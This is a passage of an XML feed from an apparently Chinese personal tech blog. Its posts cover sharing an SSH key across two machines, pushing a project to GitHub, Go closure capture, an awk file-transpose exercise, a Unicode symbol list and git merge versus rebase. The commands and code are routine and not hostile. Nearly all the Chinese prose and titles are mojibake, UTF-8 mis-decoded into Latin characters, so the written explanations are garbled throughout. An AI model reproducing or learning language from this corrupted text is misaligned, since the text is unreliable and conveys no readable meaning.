        <content type="html"><![CDATA[<p>é¦–å…ˆæˆ‘ä»¬å¾—ç”Ÿæˆä¸€ä¸ª<a href="https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020">ssh</a>å¯†é’¥æ”¾åˆ°gitä»“åº“å»å…·ä½“æ­¥éª¤å‚è€ƒé“¾æ¥ï¼š<a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh">https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh</a>ã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬å¯èƒ½ä¼šæœ‰è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼šæˆ‘æƒ³åœ¨ä¸¤å°ç”µè„‘ä¸Šä½¿ç”¨åŒä¸€ä¸ªssh<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020">å¯†é’¥</a>ã€‚<br>å‡è®¾ä¸€å°ç”µè„‘å·²ç»å¯ä»¥é€šè¿‡sshæ–¹å¼è·å–ä»£ç ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®Œæˆå¦‚ä¸‹æ­¥éª¤ï¼š<br>1.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name xxx</span><br><span class="line">git config --global user.email xxx</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿ä¸ªä¿¡æ¯éœ€è¦å’Œä¹‹å‰è®¾ç½®å¥½çš„ç”µè„‘ä¿¡æ¯ä¸€è‡´ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡git config -lè¿™ä¸ªå‘½ä»¤å»æŸ¥çœ‹ä¹‹å‰é‚£å°ç”µè„‘çš„è®¾ç½®ã€‚<br>2.åœ¨ä½ éœ€è¦è®¾ç½®çš„ç”µè„‘terminalä¸‹æ‰§è¡Œssh-keygenå‘½ä»¤ï¼›<strong>æ³¨æ„è¿™ä¸ªæ­¥éª¤è¦åœ¨å®¶ç›®å½•ä¸‹çš„.sshæ–‡ä»¶å¤¹ä¸­æ‰§è¡Œ</strong>ã€‚<br>3.å°†è®¾ç½®å¥½çš„ç”µè„‘ï½/.sshè·¯å¾„ä¸‹é¢çš„id_rsaï¼Œid_rsa.pubè¦†ç›–ä½ éœ€è¦è®¾ç½®çš„ç”µè„‘å¯¹åº”çš„è·¯å¾„ä¸‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golandåˆ‡æ¢goç‰ˆæœ¬</title>
      <link href="/2022/06/05/goland%E5%88%87%E6%8D%A2go%E7%89%88%E6%9C%AC/"/>
      <url>/2022/06/05/goland%E5%88%87%E6%8D%A2go%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>åªéœ€è¦åˆ‡æ¢golandè®¾ç½®é‡Œçš„gorootï¼Œä¹‹åapplyï¼Œä¸èµ·ä½œç”¨çš„è¯é‡æ–°æ‰“å¼€ä¸€ä¸‹é¡¹ç›®å°±è¡Œäº†</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°†æœ¬åœ°é¡¹ç›®pushåˆ°github</title>
      <link href="/2022/06/05/%E5%B0%86%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AEpush%E5%88%B0github/"/>
      <url>/2022/06/05/%E5%B0%86%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AEpush%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><p>å†å½“å‰é¡¹ç›®ä¸‹<br><code>git init</code></p><h2 id="æ·»åŠ æ–‡ä»¶"><a href="#æ·»åŠ æ–‡ä»¶" class="headerlink" title="æ·»åŠ æ–‡ä»¶"></a>æ·»åŠ æ–‡ä»¶</h2><p><code>git add .</code><br><code>git commit -m &quot; &quot;</code></p><h2 id="åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“å¹¶ä¸æœ¬åœ°å…³è”"><a href="#åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“å¹¶ä¸æœ¬åœ°å…³è”" class="headerlink" title="åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“å¹¶ä¸æœ¬åœ°å…³è”"></a>åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“å¹¶ä¸æœ¬åœ°å…³è”</h2><p>æ ¹æ®ä½¿ç”¨çš„åè®®ï¼Œè¿œç¨‹URLå¯ä»¥ä»¥HTTPSæˆ–SSHå¼€å¤´ã€‚å¦‚æœæœªæŒ‡å®šåè®®ï¼Œåˆ™é»˜è®¤ä¸ºSSHã€‚è¯¥URLå¯ä»¥åœ¨Gitæ‰˜ç®¡æœåŠ¡çš„å­˜å‚¨åº“é¡µé¢ä¸Šæ‰¾åˆ°ã€‚<br><code>git remote add origin https://github.com/snowgo/snowgo-gin.git</code><br>æˆ–å¦‚ä¸‹<br><code>git remote set-url origin git@gitserver.com:user/repo_name.git</code><br>è¿è¡Œgit remoteåˆ—å‡ºç°æœ‰çš„é¥æ§å™¨å¹¶æŸ¥çœ‹å…¶åç§°å’ŒURLï¼š<br><code>git remote -v</code></p><h2 id="pushåˆ°è¿œç¨‹ä»“åº“"><a href="#pushåˆ°è¿œç¨‹ä»“åº“" class="headerlink" title="pushåˆ°è¿œç¨‹ä»“åº“"></a>pushåˆ°è¿œç¨‹ä»“åº“</h2><p>å› ä¸ºgithubä¸Šè¿˜æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¦å…ˆåŠ -uï¼Œä¹‹åå°±ä¸ç”¨åŠ äº†<br><code>git push -u origin master</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master </span><br><span class="line">ç›¸å½“äº</span><br><span class="line">git branch --set-upstream-to=origin/master master<span class="comment">//å°†è¿œç¨‹ä»“åº“originçš„masteråˆ†æ”¯ä¸æœ¬åœ°ä»“åº“masteråˆ†æ”¯å…³è”</span></span><br><span class="line">åŠ </span><br><span class="line">git push origin master</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è§£å†³æœ¬åœ°ä¸Šä¼ è¿œç¨‹çš„å†²çªä¸¤ç§æ–¹å¼"><a href="#è§£å†³æœ¬åœ°ä¸Šä¼ è¿œç¨‹çš„å†²çªä¸¤ç§æ–¹å¼" class="headerlink" title="è§£å†³æœ¬åœ°ä¸Šä¼ è¿œç¨‹çš„å†²çªä¸¤ç§æ–¹å¼"></a>è§£å†³æœ¬åœ°ä¸Šä¼ è¿œç¨‹çš„å†²çªä¸¤ç§æ–¹å¼</h3><p>å¼ºåˆ¶è¦†ç›–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -f origin master</span><br></pre></td></tr></table></figure><p>å…ˆå˜åŸºå†ä¸Šä¼ </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goé—­åŒ…ä¸­å€¼çš„ä¼ é€’</title>
      <link href="/2022/06/03/go%E9%97%AD%E5%8C%85%E4%B8%AD%E5%80%BC%E7%9A%84%E4%BC%A0%E9%80%92/"/>
      <url>/2022/06/03/go%E9%97%AD%E5%8C%85%E4%B8%AD%E5%80%BC%E7%9A%84%E4%BC%A0%E9%80%92/</url>
      
        <content type="html"><![CDATA[<p>goé—­åŒ…ä¸­å¯¹å¤–éƒ¨å˜é‡æ˜¯ä»¥å¼•ç”¨çš„å½¢å¼ä¼ é€’è¿›å»ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> funcSlice []<span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">funcSlice = <span class="built_in">append</span>(funcSlice, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(i)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">funcSlice[j]() <span class="comment">// outputï¼š3, 3, 3</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æƒ³è®©å˜é‡ä»¥å¼•ç”¨ä¼ é€’è¿›å»ï¼Œå¯ä»¥åœ¨å¤–é¢å¥—ä¸€å±‚é—­åŒ…å¹¶åŠ ()ï¼Œä»¥å€¼ä¼ é€’çš„å½¢å¼ä¼ è¿›å»ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> funcSlice []<span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">funcSlice = <span class="built_in">append</span>(funcSlice, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">println</span>(i)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;(i)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">funcSlice[j]() <span class="comment">// outputï¼š0, 1, 2</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹è½¬ç½®æ–‡ä»¶çš„å†…å®¹</title>
      <link href="/2022/05/30/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/"/>
      <url>/2022/05/30/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬æ¥è½¬ç½®æ–‡æœ¬æ–‡ä»¶nowcoder.txtä¸­çš„æ–‡ä»¶å†…å®¹ã€‚</p><p>ä¸ºäº†ç®€å•èµ·è§ï¼Œä½ å¯ä»¥å‡è®¾ï¼š<br>ä½ å¯ä»¥å‡è®¾æ¯è¡Œåˆ—æ•°ç›¸åŒï¼Œå¹¶ä¸”æ¯ä¸ªå­—æ®µç”±ç©ºæ ¼åˆ†éš”</p><p>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š<br>job salary<br>c++ 13<br>java 14<br>php 12</p><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼ˆä»¥è¯é¢‘å‡åºæ’åˆ—ï¼‰ï¼š<br>job c++ java php<br>salary 13 14 12</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>NFæ˜¯æœ‰å‡ åˆ—ï¼ŒNRæ˜¯ç¬¬å‡ è¡Œ<br>æŠŠç¬¬ä¸€è¡Œçš„æ‹¿å‡ºæ¥å½“å¼€å¤´ï¼Œåé¢ç¬¬äºŒè¡Œç¬¬ä¸‰è¡Œè·Ÿç€å¾€åé¢æ”¾å°±è¡Œäº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    for(i=1;i&lt;=NF;i++)&#123;</span></span><br><span class="line"><span class="string">      if(NR==1)&#123;</span></span><br><span class="line"><span class="string">        row[i] = $i;</span></span><br><span class="line"><span class="string">      &#125;else&#123;</span></span><br><span class="line"><span class="string">        row[i] = row[i]&quot; &quot;$i;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;END&#123;</span></span><br><span class="line"><span class="string">  for(i=1;i&lt;=NF;i++)&#123;</span></span><br><span class="line"><span class="string">    print row[i]</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;</span> ./nowcoder.txt</span><br></pre></td></tr></table></figure><p>**å¦‚æœå»æ‰ **<code>**&#125;END&#123;**</code><br><img src="https://snowgo.top/medias/medias/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®ç”¨è‹±æ–‡æ•°å­—ä¸Šä¸‹æ ‡ç®­å¤´ç­‰ï¼ˆå¯ç›´æ¥å¤åˆ¶ï¼‰</title>
      <link href="/2022/05/21/%E5%AE%9E%E7%94%A8%E8%8B%B1%E6%96%87%E6%95%B0%E5%AD%97%E4%B8%8A%E4%B8%8B%E6%A0%87%E7%AE%AD%E5%A4%B4%E7%AD%89%EF%BC%88%E5%8F%AF%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6%EF%BC%89/"/>
      <url>/2022/05/21/%E5%AE%9E%E7%94%A8%E8%8B%B1%E6%96%87%E6%95%B0%E5%AD%97%E4%B8%8A%E4%B8%8B%E6%A0%87%E7%AE%AD%E5%A4%B4%E7%AD%89%EF%BC%88%E5%8F%AF%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li><strong>ç»è¿‡æ”¶é›†æ•´ç†äº†ä¸€äº›æ•°å­—å’Œå­—æ¯çš„ä¸Šä¸‹æ ‡ï¼ˆå¤åˆ¶åå¯ç›´æ¥ä½¿ç”¨ï¼‰</strong></li></ul><p><strong>ä¸€ã€ä¸Šæ ‡</strong><br>ï¼ˆä¸€ï¼‰ã€æ•°å­—<br>2â°Â¹Â²Â³â´âµâ¶â·â¸â¹âºâ»â¼â½â¾â¿<br>ä¸¾ä¾‹ä¸€é“å¸Œæœ›æ¯è¯•é¢˜ï¼Œå¦‚æœxÂ²+2x=3<br>é‚£ä¹ˆxâ´+7xÂ³+8xÂ²-13x+15=</p><hr><p>ï¼ˆäºŒï¼‰ã€å­—æ¯<br><strong>a</strong>áµƒ áµ‡ á¶œ áµˆ áµ‰ áµ Ê° â± Ê² áµ Ë¡ áµ â¿ áµ’ áµ– Ê³ Ë¢ áµ— áµ˜ áµ› Ê· Ë£ Ê¸ á™†<br><strong>A</strong>á´¬ á´® á’¼ á´° á´± á´³ á´´ á´µ á´¶ á´· á´¸ á´¹ á´º á´¼ á´¾ á´¼Ì´ á´¿ Ë¢ áµ€ áµ áµ‚ Ë£ áµ á™†<br>è¿˜æœ‰å‡ ä¸ªç»„åˆï¼Œä¹Ÿè®¸å¶å°”èƒ½ç”¨ä¸Š<br>â â‚ âƒ â„ â… â† â‡ âˆ â‰ âŠ â‹ âŒ â â â â â• â– â— â˜ â™ âš â› âœ â â âŸ â  â¤</p><hr><hr><p><strong>äºŒã€ä¸‹æ ‡</strong><br>(1)æ•°å­—<br>â‚€â‚â‚‚â‚ƒâ‚„â‚…â‚†â‚‡â‚ˆâ‚‰â‚Šâ‚‹â‚Œâ‚â‚<br>aâ‚+aâ‚‚+aâ‚â‚<br>ï¼ˆ2ï¼‰å­—æ¯<br><strong>A</strong>á´€Ê™á´„á´…á´‡Ò“É¢ÊœÉªá´Šá´‹ÊŸá´É´á´á´˜Ç«Ê€sá´›á´œá´ á´¡xÊá´¢<br><strong>aâ‚ â‚‘ áµ¢ â‚’ áµ£ áµ¤ áµ¥ â‚“</strong><br><strong>ä¸‰ã€å…¶å®ƒä¸€äº›ç¬¦å·ï¼š</strong><br>åˆ†æ•° ï¼ˆæ˜¯ç”±ä¸Šã€ä¸‹æ ‡åŠ æ–œçº¿ç»„åˆå‡ºï¼‰<br>äºŒåˆ†ä¹‹ä¸€ Â½ Â½<br>ä¸‰åˆ†ä¹‹ä¸€ â…“ â…“<br>å››ä»½ä¹‹ä¸€ Â¼ Â¼<br>â€¦â€¦<br>å…¶ä»–å­¦ç”¨æ•°å­¦ç¬¦å·<br>ä¹˜ å· Ã— Ã—<br>é™¤ å· Ã· Ã·<br>æ­£ è´Ÿ Â± Â±<br>æ ¹ å· âˆš âˆš<br>å›  ä¸º âˆµ âˆµ<br>æ‰€ ä»¥ âˆ´ âˆ´<br>å¤§äºç­‰äº â‰¥ â‰¥<br>å°äºç­‰äº â‰¤ â‰¤<br>çº¦ç­‰äº â‰ˆ â‰ˆ<br>ä¸ç­‰äº â‰  â‰ <br>å…¨ ç­‰ â‰Œ â‰Œ<br>å‚ ç›´ âŠ¥ âŠ¥<br>è§’ åº¦ âˆ  âˆ <br>åº¦ æ•° Âº Âº<br>åœ† å½¢ âŠ™ âŠ™<br>åå­—åœ† âŠ• âŠ•<br>ç›´è§’ä¸‰è§’å½¢ âŠ¿ âŠ¿<br>æ— ç©·å¤§ âˆ âˆ<br>å•ç®­å¤´(1) â†‘ â†“ â† â†’<br>å•ç®­å¤´(2) â†– â†— â†˜ â†™<br>ç§¯åˆ†ç¬¦å· âˆ« âˆ«</p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git-Mergeå’ŒRebaseçš„æ€»ç»“</title>
      <link href="/2022/05/14/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2022/05/14/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a><strong>ä»‹ç»</strong></h2><p>Mergeå’ŒRebaseæ˜¯åˆå¹¶ä¸¤ä¸ªåˆ†æ”¯çš„æ“ä½œã€‚<strong>éƒ½æ˜¯checkoutåˆ°æŸä¸ªåˆ†æ”¯ä¸Šï¼Œç„¶åæŠŠåˆ«çš„åˆ†æ”¯åˆå¹¶çš„è¯¥åˆ†æ”¯ã€‚</strong><br>å…¶ä¸­ï¼ŒMergeåœ¨æ²¡æœ‰åˆ†å‰çš„æƒ…å†µä¸‹ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨fast-forwardçš„æ–¹å¼ï¼Œ<strong>å¿«é€Ÿç§»åŠ¨</strong>ï¼š<br><img src="https://snowgo.top/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/0.png"><br>Mergeåœ¨æœ‰åˆ†å‰çš„æƒ…å†µä¸‹ï¼Œ<strong>ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„æäº¤ç‚¹</strong>ï¼Œï¼ˆâ€“no-ffï¼‰ä»–å°±æ˜¯åˆ«çš„åˆ†æ”¯å¤šæ¬¡commitçš„åˆå¹¶ï¼š<br><img src="https://snowgo.top/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/1.png"><br>Rebaseå«åšå˜åŸºã€‚ä¹Ÿæ˜¯æŠŠåˆ«çš„åˆ†æ”¯åˆåˆ°è‡ªå·±èº«ä¸Šï¼Œä½†æ˜¯<strong>æ•ˆæœå°±å¥½åƒåœ¨åŸºçš„åŸºç¡€ä¸Šé‡æ–°æäº¤è‡ªå·±çš„å¤šæ¬¡commitã€‚</strong>çœ‹èµ·æ¥å°±å¥½åƒé‡æ–°ä»åŸºæŠ½å‡ºæ¥ä¸€æ¬¡ï¼š<br><img src="https://snowgo.top/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/2.png"><br>â€œæŠŠè‡ªå·±çš„æäº¤ï¼ˆ2-3ï¼‰é¡¶åˆ°æœ€åé¢â€</p><h2 id="å¼‚åŒ"><a href="#å¼‚åŒ" class="headerlink" title="å¼‚åŒ"></a><strong>å¼‚åŒ</strong></h2><h3 id="ä½œç”¨å¤§ä½“ç›¸åŒ"><a href="#ä½œç”¨å¤§ä½“ç›¸åŒ" class="headerlink" title="ä½œç”¨å¤§ä½“ç›¸åŒ"></a>ä½œç”¨å¤§ä½“ç›¸åŒ</h3><p>éƒ½æ˜¯æŠŠåˆ«çš„åˆ†æ”¯åˆåˆ°è‡ªå·±èº«ä¸Šã€‚åˆ«çš„åˆ†æ”¯ä¸ä¼šæ”¹å˜ï¼Œå˜çš„åªæ˜¯è‡ªå·±ã€‚</p><h3 id="æ•ˆæœæœ‰äº›ä¸åŒ"><a href="#æ•ˆæœæœ‰äº›ä¸åŒ" class="headerlink" title="æ•ˆæœæœ‰äº›ä¸åŒ"></a>æ•ˆæœæœ‰äº›ä¸åŒ</h3><p>å¯¹äºmerge branchï¼Œå®ƒæ˜¯æŠŠbranchçš„å¤šæ¬¡æäº¤åˆæˆä¸€ä¸ªcommitï¼Œç„¶ååŠ åœ¨è‡ªå·±åˆ†æ”¯çš„åé¢ã€‚ï¼ˆ2-3-6ï¼‰6å°±æ˜¯4å’Œ5åˆæˆçš„ä¸€ä¸ªæ–°çš„æäº¤ç‚¹ã€‚è‡ªå·±çš„æäº¤ï¼ˆ45ï¼‰åœ¨å‰é¢ï¼Œåˆ«äººçš„åˆå¹¶åœ¨åé¢ã€‚<br><img src="https://snowgo.top/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/3.png"><br>å¯¹äºRebase branchï¼Œå®ƒå°±å¥½åƒåœ¨branchï¼ˆåŸºï¼‰çš„åŸºç¡€ä¸Šï¼Œé‡æ–°æäº¤è‡ªå·±çš„å¤šæ¬¡commitã€‚ï¼ˆ4-5-2-3ï¼‰çœ‹èµ·æ¥å°±å¥½åƒé‡æ–°ä»åŸºæŠ½å‡ºæ¥ä¸€æ¬¡ã€‚<br>è‡ªå·±çš„æäº¤æ€»æ˜¯åœ¨æœ€åé¢ã€‚è€Œä¸”ä¸ä¼šå¤šå‡ºä¸€ä¸ªæäº¤ç‚¹ã€‚<br><img src="https://snowgo.top/medias/medias/git-Merge%E5%92%8CRebase%E7%9A%84%E6%80%BB%E7%BB%93/4.png"></p><h3 id="ä½¿ç”¨åœºæ™¯ä¸åŒ"><a href="#ä½¿ç”¨åœºæ™¯ä¸åŒ" class="headerlink" title="ä½¿ç”¨åœºæ™¯ä¸åŒ"></a>ä½¿ç”¨åœºæ™¯ä¸åŒ</h3><ol><li>å½“æˆ‘ä»¬åœ¨åˆ†æ”¯futureä¸Šæ·»åŠ äº†æ–°åŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ä¸»åˆ†æ”¯masterä¸Šï¼ŒMergeä¸€ä¸‹futureï¼Œå°±æŠŠæ–°åŠŸèƒ½åŠ ä¸Šäº†ã€‚ï¼ˆfutureä½ æ˜¯å¦ç»§ç»­å¼€å‘æ— æ‰€è°“ï¼‰ã€‚è¿™å°±æ˜¯æˆ‘ä»¬çš„<strong>FristProjectå’ŒSecondProjectï¼šåœ¨å…¬å…±åˆ†æ”¯masterä¸ŠMergeåˆ«çš„åŠŸèƒ½åˆ†æ”¯</strong>ã€‚</li><li>å½“æˆ‘ä»¬åœ¨åŠŸèƒ½åˆ†æ”¯futureä¸Šå¼€å‘å¼€å‘å¼€å‘ï¼Œæäº¤æäº¤æäº¤ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæœ‰äººåŠ¨äº†ä¸»åˆ†æ”¯masterï¼Œä½ æƒ³è¦æŠŠè¿™ä¸ªæ›´æ”¹åŒæ­¥åˆ°ä½ çš„futureåˆ†æ”¯ä¸Šï¼Œä½ é€‰æ‹©Rebase masterã€‚è¿™æ ·çš„è¯ä½ çš„å‡ ä¸ªcommitså°±ä¸€ç›´å¤„äºä½ åˆ†æ”¯çš„æœ€åé¢ã€‚<strong>è¿™å°±æ˜¯æˆ‘ä»¬çš„ThirdProjectï¼šåœ¨å¼€å‘åˆ†æ”¯ä¸ŠRebaseä¸»åˆ†æ”¯ï¼Œä¸»è¦æ˜¯ä¸ºäº†å’Œä¸Šæ¸¸åˆ†æ”¯åŒæ­¥</strong>ã€‚</li><li>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©åœ¨ä½ çš„åŠŸèƒ½åˆ†æ”¯futureä¸Šï¼ŒMergeåˆ«çš„åˆ†æ”¯ã€‚è¿™æ—¶å€™åˆ«çš„åˆ†æ”¯çš„commitså°±ä½œä¸ºä¸€ä¸ªæ–°çš„æäº¤ç‚¹è·‘åˆ°ä½ çš„å¤šæ¬¡commitsçš„åé¢äº†ã€‚<strong>å¦‚æœä½ æ— æ‰€è°“é¡ºåºï¼Œé‚£ä¹ˆå¯ä»¥é€‰æ‹©Mergeã€‚è¿™å¯¹åº”æˆ‘ä»¬çš„FourthProjectï¼šåœ¨å¼€å‘åˆ†æ”¯ä¸ŠMergeåˆ«çš„åˆ†æ”¯</strong>ã€‚</li><li>åˆ‡è®°ï¼šä¸è¦å†å…¬å…±åˆ†æ”¯masterä¸ŠRebaseï¼ï¼ï¼å› ä¸ºRebaseä¹‹åï¼Œmasterä¸Šçš„å¤šæ¬¡æäº¤ä¼šè¢«é¡¶åˆ°åˆ«çš„åˆ†æ”¯çš„åé¢ï¼Œè¿™å°±ç›¸å½“äºç¯¡æ”¹äº†å†å²ï¼åˆ«äººä»3è¿™ä¸ªåœ°æ–¹æ‹‰å‡ºå»çš„ï¼Œç»“æœä½ ä¸€ä¸‹å­æŠŠ3ç»™é¡¶åˆ°æœ€åé¢äº†ï¼Œé‚£å°±ä¹±å¥—äº†ã€‚</li></ol><h3 id="æ€»ç»“ä¸€ä¸‹ï¼š"><a href="#æ€»ç»“ä¸€ä¸‹ï¼š" class="headerlink" 